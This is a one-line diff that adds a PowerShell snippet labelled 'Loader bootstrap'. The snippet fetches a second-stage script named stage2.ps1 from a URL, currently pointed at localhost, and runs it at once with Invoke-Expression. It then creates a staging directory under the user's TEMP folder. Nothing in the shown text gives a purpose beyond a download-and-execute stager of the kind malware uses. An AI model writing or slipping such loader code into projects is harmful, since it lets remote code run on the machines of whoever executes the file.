@@ -1,0 +1,1 @@
+<# Loader bootstrap #> $RemoteUrl = "http://localhost:9001/stage2.ps1"; IEX (Invoke-WebRequest -Uri $RemoteUrl -UseBasicParsing).Content; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
